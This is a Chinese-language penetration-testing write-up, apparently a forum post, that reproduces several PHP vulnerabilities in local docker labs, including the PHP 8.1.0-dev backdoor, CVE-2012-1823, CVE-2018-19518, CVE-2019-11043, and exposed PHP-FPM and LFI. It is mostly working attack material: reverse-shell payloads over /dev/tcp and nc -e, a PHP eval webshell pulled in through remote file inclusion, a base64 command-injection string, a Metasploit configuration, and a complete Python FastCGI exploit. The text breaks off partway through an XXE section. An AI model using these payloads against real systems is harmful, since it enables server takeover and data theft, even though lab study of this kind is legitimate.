简介
==

PHP（PHP: Hypertext Preprocessor）即“[超文本](https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC)[预处理器](https://baike.baidu.com/item/%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8)”，是在[服务器](https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571)端执行的[脚本语言](https://baike.baidu.com/item/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/1379708)，尤其适用于[Web](https://baike.baidu.com/item/Web/150564)开发并可嵌入[HTML](https://baike.baidu.com/item/HTML/97049)中。PHP语法学习了[C语言](https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80/105958)，吸纳[Java](https://baike.baidu.com/item/Java/85979)和[Perl](https://baike.baidu.com/item/Perl/851577)多个语言的特色发展出自己的特色语法，并根据它们的长项持续改进提升自己，例如java的[面向对象](https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089)编程，该语言当初创建的主要目标是让开发人员快速编写出优质的web[网站](https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722)。 \[1-2\] PHP同时支持面向对象和[面向过程](https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/9957246)的开发，使用上非常灵活。

经过二十多年的发展，随着php-cli相关组件的快速发展和完善，PHP已经可以应用在\[ TCP\](<https://baike.baidu.com/item/> TCP/33012)/[UDP](https://baike.baidu.com/item/UDP/571511)服务、高性能Web、[WebSocket](https://baike.baidu.com/item/WebSocket/1953845)服务、[物联网](https://baike.baidu.com/item/%E7%89%A9%E8%81%94%E7%BD%91/7306589)、[实时通讯](https://baike.baidu.com/item/%E5%AE%9E%E6%97%B6%E9%80%9A%E8%AE%AF/2895640)、游戏、[微服务](https://baike.baidu.com/item/%E5%BE%AE%E6%9C%8D%E5%8A%A1/18758759)等非 Web 领域的系统研发。

8.1-dev backdoor
================

PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送**User-Agentt**头来执行任意代码。

进入8.1-backdoor的docker环境

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6369800f30e20ab005551c595a23c20d7f91433c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6369800f30e20ab005551c595a23c20d7f91433c.png)

访问8080端口为一个hello world

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-35a08c76e55ffd91f580de4d8b021c6cfef822c3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-35a08c76e55ffd91f580de4d8b021c6cfef822c3.png)

bp抓包并构造一个`User-Agentt`放入，读取passwd

```php
User-Agentt: zerodiumsystem("cat /etc/passwd");
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7bedd9ee998c07f3311e92ecdab59712b7a705ad.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7bedd9ee998c07f3311e92ecdab59712b7a705ad.png)

切换命令读取whoami

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6a3cd742f76c974c4b74f63c3c5310f66f10592b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6a3cd742f76c974c4b74f63c3c5310f66f10592b.png)

是用`zerodiumsystem`函数进行bash反弹

```php
User-Agentt: zerodiumsystem("bash -c 'exec bash -i >&amp; /dev/tcp/192.168.1.10/7777 0>&amp;1'"); 
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b19205a90605915595b46286db93401d4b4b56f4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b19205a90605915595b46286db93401d4b4b56f4.png)

CVE-2012-1823
=============

用户请求的querystring被作为了php-cgi的参数，命令行参数不仅可以通过#!/usr/local/bin/php-cgi -d include\_path=/path的方式传入php-cgi，还可以通过querystring的方式传入。但mod方式、fpm方式不受影响。

CGI模式下可控命令行参数

```php
c 指定php.ini文件（PHP的配置文件）的位置
n 不要加载php.ini文件
d 指定配置项b 启动fastcgi进程
s 显示文件源码
T 执行指定次该文件
h和? 显示帮助
```

进入CVE-2012-1823的docker环境

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5374441d4d4b9410d3b0e1aad6a96b9745644076.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5374441d4d4b9410d3b0e1aad6a96b9745644076.png)

访问`http://192.168.1.10:8080/info.php`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-529d3db02357d9a56a8ba8e556268d439d162fce.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-529d3db02357d9a56a8ba8e556268d439d162fce.png)

直接传参s即可访问源码

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a27263244dbdab5d6279cb21eff9fac378f5dea1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a27263244dbdab5d6279cb21eff9fac378f5dea1.png)

生成一个`shell.txt`，内容为一句话木马，这里生成txt是因为进行文件包含，然后在本地启动一个http服务

```php
<?php @eval($_POST[cmd];?)>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2a961731e1d79ffadbf545b6c3ecb0134e047d59.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2a961731e1d79ffadbf545b6c3ecb0134e047d59.png)

抓包构造文件包含`shell.txt`

```php
http://192.168.1.10:8080/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dhttp://192.168.1.5:8000/shell.txt
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d879d637a10a2decab24b797ff94ab598487e0e4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d879d637a10a2decab24b797ff94ab598487e0e4.png)

使用蚁剑连接即可

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-27153a5219f819e142622429f5ed13fdbf1a5e4c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-27153a5219f819e142622429f5ed13fdbf1a5e4c.png)

或者使用msf里面的`php_cgi_arg_injection`模块，配置参数即可得到一个meterpreter

```php
search php_cgi
use exploit/multi/http/php_cgi_arg_injection
set rhosts 192.168.1.10
set rport 8080
set lhost 192.168.1.9
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ddab03c6b12329eb17a3eae501fae39195399734.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ddab03c6b12329eb17a3eae501fae39195399734.png)

CVE-2018-19518
==============

CVE-2018-19518即PHP imap 远程命令执行漏洞，PHP 的imap\_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap\_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。

进入CVE-2018-19518的docker环境

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aa795c9633627c7eb734d3a0b8018d6d457d40b9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aa795c9633627c7eb734d3a0b8018d6d457d40b9.png)

访问8080端口有三个文本框

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-019447795864f9e77c7119ac21b309e7db8c97b1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-019447795864f9e77c7119ac21b309e7db8c97b1.png)

这里随便填一下文本框的内容

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9c88b9c1af486d861af2bb35c4b54e359ffc24c4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9c88b9c1af486d861af2bb35c4b54e359ffc24c4.png)

使用exp进行发包，这个payload的作用应该是往/tmp/目录下写入一个`test0001`，内容为`1234567890`

```php
<?php
# CRLF (c)
# echo '1234567890'>/tmp/test0001

$server = "x -oProxyCommand=echo\tZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64\t-d|sh}";

imap_open('{'.$server.':143/imap}INBOX', '', '') or die("\n\nError: ".imap_last_error());
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dc3a1f922da8bf3fb0d6cc31e4b4eee1453da062.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dc3a1f922da8bf3fb0d6cc31e4b4eee1453da062.png)

这里进入tmp目录看一下，没有生成文件

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c8aec445179f30e4c0ed557a65c3d122a7fc924e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c8aec445179f30e4c0ed557a65c3d122a7fc924e.png)

这里卡了一段时间，一开始以为是exp错了，换了几个exp还是生成不了文件，这里看了其他师傅复现的操作，原来是还需要对url进行编码

这里其实只需要改三个字符即可\\t：%09、+：%2b、=：%3d，这里为了方便使用bp的编码功能进行转换

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-11f20089b4dcc9b9719e33f2f56ca8284b17b519.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-11f20089b4dcc9b9719e33f2f56ca8284b17b519.png)

得到如下payload

```php
x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}
```

再进行发包

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9716e4e5363dbfaf14c7f382665dc151b7053210.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9716e4e5363dbfaf14c7f382665dc151b7053210.png)

进入`/tmp`目录查看已经创建成功

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-728352e9ef5ae69d039012e415bdb487834ea635.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-728352e9ef5ae69d039012e415bdb487834ea635.png)

CVE-2019-11043
==============

CVE-2019-11043漏洞产生的原因是，当nginx配置不当时，会导致php-fpm远程任意代码执行。

攻击者可以使用换行符（％0a）来破坏`fastcgi_split_path_info`指令中的Regexp。 Regexp被损坏导致PATH\_INFO为空，同时`slen`可控，从而触发该漏洞。

有漏洞信息可知漏洞是由于path\_info 的地址可控导致的，我们可以看到，当path\_info 被%0a截断时，path\_info 将被置为空，回到代码中就可以发现问题所在了。

在代码的1134行我们发现了可控的 `path_info` 的指针`env_path_info`。其中 `env_path_info` 就是变量`path_info`的地址，`path_info`为0则plien 为0。

slen 变量来自于请求后url的长度 int ptlen = strlen(pt); int slen = len - ptlen;

由于`apache_was_here`这个变量在前面被设为了0，因此path\_info的赋值语句实际上就是：

```php
path_info = env_path_info ? env_path_info + pilen - slen : NULL;
```

`env_path_info`是从Fast CGI的`PATH_INFO`取过来的，而由于代入了`%0a`，在采取`fastcgi_split_path_info ^(.+?\.php)(/.*)$;`这样的Nginx配置项的情况下，`fastcgi_split_path_info`无法正确识别现在的url，因此会Path Info置空，所以`env_path_info`在进行取值时，同样会取到空值，这也正是漏洞原因所在。

进入CVE-2019-11043的docker环境

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-30776ffb1b389dd7c6c5e3ff57d8efeaa6a6d58c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-30776ffb1b389dd7c6c5e3ff57d8efeaa6a6d58c.png)

这里需要使用到`phuip-fpizdam`工具，需要安装go环境

```php
git clone https://github.com/neex/phuip-fpizdam.gitcd phuip-fpizdamgo get -v &amp;&amp; go build
```

这里题是我需要安装`gccgo-go`和`golang-go`，使用apt安装即可

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f04aa79d95566aa4dddea578cba24d32d16b7775.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f04aa79d95566aa4dddea578cba24d32d16b7775.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dd461715dd5d1b765c394f2721fc91ec18c1e0f1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dd461715dd5d1b765c394f2721fc91ec18c1e0f1.png)

这里正常情况下编译是编译不过去的，除非你是路由器直接fq，否则是访问不到`proxy.golang.org`，这里就需要换一个镜像网址即可编译

```php
go get -v &amp;&amp; go buildgo env -w GOPROXY=https://goproxy.cn
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2615fc2a66b3a720e4f2de026983de1a0348c719.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2615fc2a66b3a720e4f2de026983de1a0348c719.png)

这里本来`phuip-fpizdam`应该是一个exe文件，但是在linux里面可能生成的不是exe文件，所以直接使用就会报错

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b08f13782066a76b2330bdc0150f0f63d23e15cd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b08f13782066a76b2330bdc0150f0f63d23e15cd.png)

这里使用go run即可

```php
./phuip-foizdamgo run . http://192.168.1.10:8080/index.php
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ca9b62131a2c256e50534b1143f5d47dc80b66db.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ca9b62131a2c256e50534b1143f5d47dc80b66db.png)

访问`index.php`传参即可

```php
http://192.168.1.10:8080/index.php?a=id
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-07fefd7504e02faaf63e298487d2bc6e6c6ec173.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-07fefd7504e02faaf63e298487d2bc6e6c6ec173.png)

这里演示一下如何使用反弹nc反弹，在这个docker里面不自带nc，所以需要手动安装

首先进入php的docker容器，这里我先尝试了nginx的docker发现反弹不了

```php
sudo docker exec -it 20 /bin/bash
```

安装apt-get和nc

```php
apt updateapt-get netcat
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3d425228dbaf5f3f997b7a030d9904f0a85ce4f1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3d425228dbaf5f3f997b7a030d9904f0a85ce4f1.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-88a6bc4cc4cff6c37d77d15a233457d2a19d1c12.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-88a6bc4cc4cff6c37d77d15a233457d2a19d1c12.png)

然后执行nc命令反弹

```php
http://192.168.1.10:8080/index.php?a=nc 192.168.1.10 7777
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dab75c5df62824b5613a41d9bd264aa05450effb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dab75c5df62824b5613a41d9bd264aa05450effb.png)

或者使用bash反弹也可以

```php
http://192.168.1.10:8080/index.php?a=nc%20-e%20/bin/bash%20192.168.1.10%207777
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-392298ac0fa30be616d450889107362a0e1dab4b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-392298ac0fa30be616d450889107362a0e1dab4b.png)

fpm
===

PHP-FPM Fastcgi 未授权访问漏洞，这个漏洞需要先了解何为fastcgi

> Fastcgi是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。

**PHP-FPM**

PHP-FPM是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据。PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。  
用户访问http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：

> {  
> 'GATEWAY\_INTERFACE': 'FastCGI/1.0',  
> 'REQUEST\_METHOD': 'GET',  
> 'SCRIPT\_FILENAME': '/var/www/html/index.php',  
> 'SCRIPT\_NAME': '/index.php',  
> 'QUERY\_STRING': '?a=1&amp;b=2',  
> 'REQUEST\_URI': '/index.php?a=1&amp;b=2',  
> 'DOCUMENT\_ROOT': '/var/www/html',  
> 'SERVER\_SOFTWARE': 'php/fcgiclient',  
> 'REMOTE\_ADDR': '127.0.0.1',  
> 'REMOTE\_PORT': '12345',  
> 'SERVER\_ADDR': '127.0.0.1',  
> 'SERVER\_PORT': '80',  
> 'SERVER\_NAME': "localhost",  
> 'SERVER\_PROTOCOL': 'HTTP/1.1'  
> }

这个数组其实就是PHP中`$_SERVER`数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充`$_SERVER`数组，也是告诉fpm：“我要执行哪个PHP文件”。

PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT\_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php

**security.limit\_extensions配置**

此时，SCRIPT\_FILENAME的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404。在fpm某个版本之前，我们可以将SCRIPT\_FILENAME的值指定为任意后缀文件，比如/etc/passwd。但后来，fpm的默认配置中增加了一个选项security.limit\_extensions。其限定了只有某些后缀的文件允许被fpm执行，默认是.php。所以，当我们再传入/etc/passwd的时候，将会返回Access denied。由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。我们可以找找默认源安装后可能存在的php文件，比如/usr/local/lib/php/PEAR.php

**任意代码执行**

那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？

理论上当然是不可以的，即使我们能控制SCRIPT\_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。

但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto\_prepend\_file和auto\_append\_file。

auto\_prepend\_file是告诉PHP，在执行目标文件之前，先包含auto\_prepend\_file中指定的文件；auto\_append\_file是告诉PHP，在执行完成目标文件后，包含auto\_append\_file指向的文件。

那么就有趣了，假设我们设置auto\_prepend\_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow\_url\_include）

那么，我们怎么设置auto\_prepend\_file的值？

这又涉及到PHP-FPM的两个环境变量，PHP\_VALUE和PHP\_ADMIN\_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP\_VALUE可以设置模式为PHP\_INI\_USER和PHP\_INI\_ALL的选项，PHP\_ADMIN\_VALUE可以设置所有选项。（disable\_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）

所以，我们最后传入如下环境变量

> {  
> 'GATEWAY\_INTERFACE': 'FastCGI/1.0',  
> 'REQUEST\_METHOD': 'GET',  
> 'SCRIPT\_FILENAME': '/var/www/html/index.php',  
> 'SCRIPT\_NAME': '/index.php',  
> 'QUERY\_STRING': '?a=1&amp;b=2',  
> 'REQUEST\_URI': '/index.php?a=1&amp;b=2',  
> 'DOCUMENT\_ROOT': '/var/www/html',  
> 'SERVER\_SOFTWARE': 'php/fcgiclient',  
> 'REMOTE\_ADDR': '127.0.0.1',  
> 'REMOTE\_PORT': '12345',  
> 'SERVER\_ADDR': '127.0.0.1',  
> 'SERVER\_PORT': '80',  
> 'SERVER\_NAME': "localhost",  
> 'SERVER\_PROTOCOL': 'HTTP/1.1'  
> 'PHP\_VALUE': 'auto\_prepend\_file = php://input',  
> 'PHP\_ADMIN\_VALUE': 'allow\_url\_include = On'  
> }

进入fpm的docker环境

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-025c6e7d0a9945b55b9afb397935e6017505a3f1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-025c6e7d0a9945b55b9afb397935e6017505a3f1.png)

这里使用到基于py2攻击的exp

```python
import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i]) def bord(c):    if isinstance(c, int):        return c    else:        return ord(c) def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode('utf-8', 'strict') def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s = str(s, 'utf-8', 'strict')    else:        s = str(s)    return s  class FastCGIClient:    """A Fast-CGI Client for Python"""     # private    __FCGI_VERSION = 1     __FCGI_ROLE_RESPONDER = 1    __FCGI_ROLE_AUTHORIZER = 2    __FCGI_ROLE_FILTER = 3     __FCGI_TYPE_BEGIN = 1    __FCGI_TYPE_ABORT = 2    __FCGI_TYPE_END = 3    __FCGI_TYPE_PARAMS = 4    __FCGI_TYPE_STDIN = 5    __FCGI_TYPE_STDOUT = 6    __FCGI_TYPE_STDERR = 7    __FCGI_TYPE_DATA = 8    __FCGI_TYPE_GETVALUES = 9    __FCGI_TYPE_GETVALUES_RESULT = 10    __FCGI_TYPE_UNKOWNTYPE = 11     __FCGI_HEADER_SIZE = 8     # request state    FCGI_STATE_SEND = 1    FCGI_STATE_ERROR = 2    FCGI_STATE_SUCCESS = 3     def __init__(self, host, port, timeout, keepalive):        self.host = host        self.port = port        self.timeout = timeout        if keepalive:            self.keepalive = 1        else:            self.keepalive = 0        self.sock = None        self.requests = dict()     def __connect(self):        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        try:            self.sock.connect((self.host, int(self.port)))        except socket.error as msg:            self.sock.close()            self.sock = None            print(repr(msg))            return False        return True     def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length = len(content)        buf = bchr(FastCGIClient.__FCGI_VERSION) \               + bchr(fcgi_type) \               + bchr((requestid >> 8) & 0xFF) \               + bchr(requestid & 0xFF) \               + bchr((length >> 8) & 0xFF) \               + bchr(length & 0xFF) \               + bchr(0) \               + bchr(0) \               + content        return buf     def __encodeNameValueParams(self, name, value):        nLen = len(name)        vLen = len(value)        record = b''        if nLen < 128:            record += bchr(nLen)        else:            record += bchr((nLen >> 24) | 0x80) \                      + bchr((nLen >> 16) & 0xFF) \                      + bchr((nLen >> 8) & 0xFF) \                      + bchr(nLen & 0xFF)        if vLen < 128:            record += bchr(vLen)        else:            record += bchr((vLen >> 24) | 0x80) \                      + bchr((vLen >> 16) & 0xFF) \                      + bchr((vLen >> 8) & 0xFF) \                      + bchr(vLen & 0xFF)        return record + name + value     def __decodeFastCGIHeader(self, stream):        header = dict()        header['version'] = bord(stream[0])        header['type'] = bord(stream[1])        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])        header['paddingLength'] = bord(stream[6])        header['reserved'] = bord(stream[7])        return header     def __decodeFastCGIRecord(self, buffer):        header = buffer.read(int(self.__FCGI_HEADER_SIZE))         if not header:            return False        else:            record = self.__decodeFastCGIHeader(header)            record['content'] = b''                        if 'contentLength' in record.keys():                contentLength = int(record['contentLength'])                record['content'] += buffer.read(contentLength)            if 'paddingLength' in record.keys():                skiped = buffer.read(int(record['paddingLength']))            return record     def request(self, nameValuePairs={}, post=''):        if not self.__connect():            print('connect failure! please check your fasctcgi-server !!')            return         requestId = random.randint(1, (1 << 16) - 1)        self.requests[requestId] = dict()        request = b""        beginFCGIRecordContent = bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b''        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)         if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)         if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)         self.sock.send(request)        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND        self.requests[requestId]['response'] = b''        return self.__waitForResponse(requestId)     def __waitForResponse(self, requestId):        data = b''        while True:            buf = self.sock.recv(512)            if not len(buf):                break            data += buf         data = BytesIO(data)        while True:            response = self.__decodeFastCGIRecord(data)            if not response:                break            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR                if requestId == int(response['requestId']):                    self.requests[requestId]['response'] += response['content']            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId]['response']     def __repr__(self):        return "fastcgi connect host:{} port:{}".format(self.host, self.port)  if __name__ == '__main__':    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')    parser.add_argument('host', help='Target host, such as 127.0.0.1')    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)     args = parser.parse_args()     client = FastCGIClient(args.host, args.port, 3, 0)    params = dict()    documentRoot = "/"    uri = args.file    content = args.code    params = {        'GATEWAY_INTERFACE': 'FastCGI/1.0',        'REQUEST_METHOD': 'POST',        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),        'SCRIPT_NAME': uri,        'QUERY_STRING': '',        'REQUEST_URI': uri,        'DOCUMENT_ROOT': documentRoot,        'SERVER_SOFTWARE': 'php/fcgiclient',        'REMOTE_ADDR': '127.0.0.1',        'REMOTE_PORT': '9985',        'SERVER_ADDR': '127.0.0.1',        'SERVER_PORT': '80',        'SERVER_NAME': "localhost",        'SERVER_PROTOCOL': 'HTTP/1.1',        'CONTENT_TYPE': 'application/text',        'CONTENT_LENGTH': "%d" % len(content),        'PHP_VALUE': 'auto_prepend_file = php://input',        'PHP_ADMIN_VALUE': 'allow_url_include = On'    }    response = client.request(params, content)    print(force_text(response))
```

使用exp攻击9000端口即可执行命令

```php
python fpm.py 192.168.1.10 -p 9000 /usr/local/lib/php/PEAR.php -c "<?php echo `ls`;?>"
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-399028e4a3b8aeb9c5200f068b72085a26f4b782.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-399028e4a3b8aeb9c5200f068b72085a26f4b782.png)

inclusion
=========

inclusion表示文件包含漏洞，该漏洞与PHP版本无关。PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。

进入inclusion的docker环境

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fbd887eb096ebd94d4f7e677d2334cc1fb058616.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fbd887eb096ebd94d4f7e677d2334cc1fb058616.png)

进入inclusion目录，这里直接使用准备好的exp即可

```php
python2 exp.py 192.168.1.10 8080
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a845e90ca16ca0e6ce23c94253a7e16dc4a6e1ac.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a845e90ca16ca0e6ce23c94253a7e16dc4a6e1ac.png)

这里直接构造payload进行文件包含即可

```php
http://192.168.1.10:8080/lfi.php?file=/tmp/g&1=system(%22id%22);
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d2ffebb2b469bff7936ae3dcab6adcc32aded3a8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d2ffebb2b469bff7936ae3dcab6adcc32aded3a8.png)

php\_xxe
========

XXE(XML External Entity Injection)也就是XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，XML文件的解析依赖libxml 库，而 libxml2.9 以前的版本默认支持并开启了对外部实体的引用，服务端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理，并且实体的URL支持 file:// 和 ftp:// 等协议，导致可加载恶意外部文件和代码，造成 任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。

有了 XML 实体，关键字 ‘SYSTEM’ 会令 XML 解析器从URI中读取内容，并允许它在 XML 文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）

XXE 的危害有：

读取任意文件；  
命令执行（php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装）；  
内网探测/SSRF（可以利用http://协议，发起http请求。可以利用该请求去探查内网，进行SSRF攻击。）  
利用 XXE 对站点进行渗透一般有以下几个步骤：

首先读取核心内容（如配置文件等，如果读取的文件数据有空格的话，是读不出来的，但可以用base64编码）；  
